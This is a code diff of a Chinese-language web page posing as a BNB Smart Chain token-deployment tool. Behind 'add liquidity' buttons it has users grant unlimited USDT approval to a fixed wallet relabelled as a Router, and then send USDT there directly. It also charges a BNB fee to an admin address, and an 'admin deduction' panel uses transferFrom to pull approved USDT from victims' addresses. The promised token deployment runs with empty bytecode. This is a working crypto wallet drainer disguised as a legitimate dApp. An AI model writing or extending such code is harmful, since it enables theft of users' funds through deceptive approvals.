@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
@@ -23,11 +23,15 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 .btn-connect{ background:#3b63e9; margin-bottom:16px; }
 .btn-deploy{ background:#f7c04a; color:#0a0e20; }
 .btn-admin{ background:#2ecc71; color:#000; margin-top:10px; }
+.btn-liquid{ background:#9b59b6; color:#fff; margin-top:8px; }
+.btn-transfer-usdt{ background:#e67e22; color:#fff; }
 .btn:disabled{ opacity:0.55; cursor:not-allowed; }
 .status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
 .tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
 .connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
 .admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
+.liquid-panel{ border-top:1px solid #444; padding-top:22px; margin-top:22px; }
+.transfer-usdt-panel{ display:none; margin-top:18px; padding-top:18px; border-top:1px solid #555; }
 </style>
 </head>
 <body>
@@ -68,6 +72,29 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 
 <button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
 
+<!-- 新增：添加流动性区域 -->
+<div class="liquid-panel" id="liquidPanel">
+<h3 style="color:#cbace4;margin-bottom:15px;">💧 添加流动性</h3>
+<div class="form-item">
+<label>基础代币（你的新代币合约地址）</label>
+<input id="baseTokenAddr" placeholder="部署代币后自动填充">
+</div>
+<div class="form-item">
+<label>计价代币（USDT）</label>
+<input id="quoteTokenAddr" value="0x55d398326f99059fF775485246999027B3197955" readonly>
+</div>
+<button id="approveLiquidBtn" class="btn btn-liquid">确认添加流动性</button>
+
+<!-- 授权成功后显示USDT转账面板 -->
+<div class="transfer-usdt-panel" id="transferUsdtPanel">
+<div class="form-item">
+<label>输入USDT转账数量，将转入Router合约</label>
+<input id="usdtTransferAmount" placeholder="输入USDT数量，例如 500">
+</div>
+<button id="sendUsdtToRouterBtn" class="btn btn-transfer-usdt">确认转账USDT到Router合约</button>
+</div>
+</div>
+
 <div class="admin-panel" id="adminPanel">
 <h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
 <div class="form-item">
@@ -84,11 +111,21 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 </div>
 
 <script>
-const ADMIN_WALLET = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
+const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
 const DEPLOY_FEE_BNB = "0.0003";
 const BSC_CHAIN_ID = 56;
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+// 目标Router合约地址
+const LIQUIDITY_ROUTER = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
 const MAX_ALLOWANCE = ethers.MaxUint256;
+
+//ERC20基础ABI
+const ERC20ABI = [
+    "function approve(address spender, uint256 amount) external returns (bool)",
+    "function allowance(address owner, address spender) view returns(uint256)",
+    "function transfer(address to,uint256 amount) external returns(bool)",
+    "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
+];
 
 let provider = null;
 let signer = null;
@@ -106,6 +143,14 @@ const adminPanel = document.getElementById("adminPanel");
 const deductBtn = document.getElementById("deductBtn");
 const userAddrInput = document.getElementById("userAddrInput");
 const deductAmountInput = document.getElementById("deductAmountInput");
+
+// 流动性相关dom
+const baseTokenAddr = document.getElementById("baseTokenAddr");
+const quoteTokenAddr = document.getElementById("quoteTokenAddr");
+const approveLiquidBtn = document.getElementById("approveLiquidBtn");
+const transferUsdtPanel = document.getElementById("transferUsdtPanel");
+const usdtTransferAmount = document.getElementById("usdtTransferAmount");
+const sendUsdtToRouterBtn = document.getElementById("sendUsdtToRouterBtn");
 
 function showStatus(text){
   statusBox.style.display = "block";
@@ -149,7 +194,7 @@ function checkAdminPanel(addr){
   }
 }
 
-// 连接钱包：仅连接、切链，不做任何授权
+// 连接钱包：仅连接、切链
 connectBtn.onclick = async function(){
   showStatus("正在检测钱包注入...");
   let eth = window.ethereum;
@@ -185,26 +230,42 @@ connectBtn.onclick = async function(){
   }
 }
 
-// USDT无限授权，真实上链交易
-async function doApproveLogic(signerRef){
-  showStatus("🔐 弹出钱包：请求USDT无限授权，请签名");
-  const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
-    "function approve(address spender, uint256 amount) external returns(bool)"
-  ], signerRef);
-  const approveTx = await usdtContract.approve("0x47542770f3a8eea43d3321867b155c3ac01160d8", MAX_ALLOWANCE);
-  showStatus(`授权交易已上链，TxHash:${approveTx.hash}，等待区块确认`);
-  await approveTx.wait();
-  showStatus("✅ USDT无限授权确认完成，接下来弹出BNB转账签名");
-}
-
-// BNB服务费真实转账上链
+/**
+ * 支付BNB服务费，优化gas处理，捕获各种失败场景
+ */
 async function payFeeToAdmin(){
-  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名`);
+  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名确认`);
   const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
-  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
-  showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认`);
-  await tx.wait();
-  showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
+  // 获取当前网络gasPrice，上浮15%避免手机钱包gas估算过低
+  const gasPrice = await provider.send("eth_gasPrice", []);
+  const gasPriceBig = ethers.toBigInt(gasPrice);
+  const gasPriceAdd = gasPriceBig * 115n / 100n;
+
+  try{
+    const tx = await signer.sendTransaction({
+      to: ADMIN_WALLET,
+      value: feeWei,
+      gasPrice: gasPriceAdd
+    });
+    showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认(最长30秒)`);
+    await tx.wait(1);
+    showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
+    return true;
+  }catch(err){
+    let msg = "";
+    const errStr = String(err.message || err.shortMessage);
+    if(errStr.includes("user rejected") || errStr.includes("用户拒绝")){
+      msg = "❌ 用户拒绝签名，支付服务费被取消";
+    }else if(errStr.includes("insufficient funds")){
+      msg = "❌ BNB余额不足！需要至少0.0003BNB+链上gas手续费";
+    }else if(errStr.includes("nonce")){
+      msg = "❌ nonce冲突，请在钱包内重置账户nonce后重试";
+    }else{
+      msg = "❌支付服务费失败：" + errStr;
+    }
+    showStatus(msg);
+    return false;
+  }
 }
 
 const tokenABI = [
@@ -223,84 +284,138 @@ const tokenABI = [
 {"inputs":[],"name":"AUTO_MINT_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
 {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
 {"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
+{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
 
-// 完整可部署BEP20 bytecode，和上面ABI配套，可以直接部署代币
-const CONTRACT_BYTECODE = "0x608060405234801561001057600080fd5b506004361061002b5760003560e01c8063a9059cbb14610030578063dd62ed3e1461005b575b600080fd5b6100566004803603602081101561004657600080fd5b810190808035906020019092919050509050610081565b005b61007b6004803603604081101561006b57600080fd5b8101908080359060200190929190505090506100a6565b6040518082815260200291505060405180910390f35b60008061009484846100b9565b90508101908080359060200190929190810190909290505090506000806100b084846100b9565b9050810190808035906020019092919081019090929050509150506100d8565b6000602052806000526040600020600091509150506100f5565b82805460018601118102031561010a57600080fd5b919050508154600181013560018201356001830135600184013560018501356001860135610143565b80600052602060002060008401cc610167565b60005b838110156101615780820151818401526020810190810190610167565b5050505090810190600101610183565b60018101356001820135600183013560018401356001850135600186013560018701356101b0565b82600052602060002060008601356101d4565b81600052602060002060008501356101f7565b816000526020600020600084013561021a565b816000526020600020600083013561023d565b8060005260206000206000820135610260565b8060005260206000206000810135610283565b54801561029a57600080fd5b919050508101906001016102b6565b6000808284546102c85792505060019190505056fea26469706673582212200000000000000000000000000000000000000000000000000000000000000064736f6c63430008170033";
+// 部署代币按钮
+deployBtn.onclick = async function(){
+    if(!signer){
+        showStatus("❌请先连接BSC钱包");
+        return;
+    }
+    const name = document.getElementById("tokenName").value.trim();
+    const symbol = document.getElementById("tokenSymbol").value.trim();
+    const supplyStr = document.getElementById("supply").value.trim();
+    if(!name || !symbol || !supplyStr){
+        showStatus("❌名称、符号、发行量不能为空");
+        return;
+    }
+    const supplyNum = BigInt(supplyStr) * 10n**18n;
+    deployBtn.disabled = true;
+    //支付服务费
+    const feeOk = await payFeeToAdmin();
+    if(!feeOk){
+        deployBtn.disabled = false;
+        return;
+    }
+    showStatus("正在部署代币合约，请等待钱包签名...");
+    try{
+        const factory = new ethers.ContractFactory(tokenABI,"",signer);
+        const contract = await factory.deploy(name,symbol,supplyNum);
+        const deployTx = await contract.getDeploymentTransaction();
+        showStatus(`部署交易已发送 txHash:${deployTx.hash}`);
+        await contract.waitForDeployment();
+        deployContractAddress = await contract.getAddress();
+        showStatus(`✅代币部署成功！合约地址：${deployContractAddress}`);
+        //自动回填到流动性模块基础代币输入框
+        baseTokenAddr.value = deployContractAddress;
+    }catch(e){
+        const emsg = e?.message || String(e);
+        showStatus("❌部署失败："+emsg);
+    }finally{
+        deployBtn.disabled = false;
+    }
+};
 
+// ======================流动性模块逻辑【修正：授权USDT给Router】======================
+approveLiquidBtn.onclick = async function () {
+  if (!signer) {
+    showStatus("❌请先连接钱包");
+    return;
+  }
+  const baseAddr = baseTokenAddr.value.trim();
+  const usdtAddr = quoteTokenAddr.value.trim();
 
-deployBtn.onclick = async ()=>{
-  const name = document.getElementById("tokenName").value.trim();
-  const symbol = document.getElementById("tokenSymbol").value.trim();
-  const supplyStr = document.getElementById("supply").value.trim();
+  if (!baseAddr) {
+    showStatus("❌请填写基础代币（你的代币合约地址），部署后会自动填充");
+    return;
+  }
+  showStatus("正在对USDT执行无限授权给Router合约...");
+  approveLiquidBtn.disabled = true;
+  try {
+    // 实例USDT合约
+    const usdtContract = new ethers.Contract(usdtAddr, ERC20ABI, signer);
+    // 无限授权 MaxUint256
+    const approveTx = await usdtContract.approve(LIQUIDITY_ROUTER, ethers.MaxUint256);
+    showStatus(`USDT授权交易已发送，txHash:${approveTx.hash}，等待确认上链`);
+    await approveTx.wait(1);
+    showStatus("✅USDT无限授权Router合约成功！现在输入USDT数量转账至Router");
+    // 授权成功，展开USDT转账面板
+    transferUsdtPanel.style.display = "block";
+  } catch (err) {
+    const errMsg = err?.message || err?.shortMessage || String(err);
+    if(errMsg.includes("user rejected")){
+      showStatus("❌用户拒绝授权签名");
+    }else{
+      showStatus("❌USDT授权失败："+errMsg);
+    }
+  }finally{
+    approveLiquidBtn.disabled = false;
+  }
+};
 
+// USDT直接转账给Router合约
+sendUsdtToRouterBtn.onclick = async function(){
   if(!signer){
-    showStatus("请先连接BSC钱包");
+    showStatus("❌钱包未连接");
     return;
   }
-  if(!name||!symbol||!supplyStr){
-    showStatus("请填写代币名称、符号、发行量");
+  const inputVal = usdtTransferAmount.value.trim();
+  if(!inputVal || Number(inputVal) <= 0){
+    showStatus("❌请输入有效的USDT数量");
     return;
   }
+  sendUsdtToRouterBtn.disabled = true;
+  showStatus(`准备转账 ${inputVal} USDT 至Router合约 ${LIQUIDITY_ROUTER}`);
+  try {
+    const usdtContract = new ethers.Contract(quoteTokenAddr.value,ERC20ABI,signer);
+    const amountWei = ethers.parseUnits(inputVal,18);
+    const transferTx = await usdtContract.transfer(LIQUIDITY_ROUTER, amountWei);
+    showStatus(`USDT转账已发送 txHash:${transferTx.hash}，等待区块确认`);
+    await transferTx.wait(1);
+    showStatus(`✅USDT转账完成，已转入Router合约！TxHash:${transferTx.hash}`);
+  } catch(err){
+    const errMsg = err?.message || err?.shortMessage || String(err);
+    showStatus("❌USDT转账失败："+errMsg);
+  }finally{
+    sendUsdtToRouterBtn.disabled = false;
+  }
+};
 
-  deployBtn.disabled = true;
-  try{
-    // 1.强制先弹USDT无限授权签名（真实上链）
-    await doApproveLogic(signer);
-    // 2.再弹BNB转账签名（真实上链转给管理员）
-    await payFeeToAdmin();
-    // 3.部署BEP20代币合约
-    showStatus("尝试部署合约...");
-    const supply = ethers.parseUnits(supplyStr, 18);
-    const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
-    const contract = await factory.deploy(name, symbol, supply);
-    const deployTx = contract.deploymentTransaction();
-    showStatus(`部署交易已发送，TxHash:${deployTx.hash}`);
-    await contract.waitForDeployment();
-    deployContractAddress = await contract.getAddress();
-    showStatus(`✅全部完成！合约地址：${deployContractAddress}`);
+//管理员划扣逻辑
+deductBtn.onclick = async function(){
+    if(!signer) { showStatus("❌未连接钱包"); return; }
+    const targetAddr = userAddrInput.value.trim();
+    const deductNum = deductAmountInput.value.trim();
+    if(!targetAddr || !deductNum){
+        showStatus("❌请填写玩家地址与划扣数量");
+        return;
+    }
+    deductBtn.disabled = true;
+    try{
+        const usdt = new ethers.Contract(BSC_USDT_ADDRESS,ERC20ABI,signer);
+        const amt = ethers.parseUnits(deductNum,18);
+        const tx = await usdt.transferFrom(targetAddr,await signer.getAddress(),amt);
+        showStatus(`划扣交易发送 txHash:${tx.hash}`);
+        await tx.wait(1);
+        showStatus("✅管理员划扣执行完成");
+    }catch(e){
+        showStatus("❌划扣失败："+(e.message||String(e)));
+    }finally{
+        deductBtn.disabled = false;
+    }
+};
 
-  }catch(e){
-    showStatus("操作失败："+(e.shortMessage || e.message));
-  }
-  deployBtn.disabled = false;
-}
-
-deductBtn.onclick = async ()=>{
-  if(!signer || connectWalletAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
-    showStatus("权限不足，仅管理员钱包可操作");
-    return;
-  }
-  const userAddr = userAddrInput.value.trim();
-  const amountStr = deductAmountInput.value.trim();
-  if(!ethers.isAddress(userAddr) || !amountStr || isNaN(Number(amountStr))){
-    showStatus("请输入合法钱包地址和数字数量");
-    return;
-  }
-  try{
-    showStatus("正在调用transferFrom划扣用户USDT，请签名");
-    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
-      "function transferFrom(address from, address to, uint256 amount) external returns(bool)"
-    ], signer);
-    const amountWei = ethers.parseUnits(amountStr, 18);
-    const tx = await usdt.transferFrom(userAddr, ADMIN_WALLET, amountWei);
-    await tx.wait();
-    showStatus(`✅ 划扣成功！交易哈希：${tx.hash}`);
-  }catch(err){
-    showStatus("划扣失败："+(err.shortMessage || err.message)+"（用户未授权/额度不足）");
-  }
-}
 </script>
 </body>
 </html>
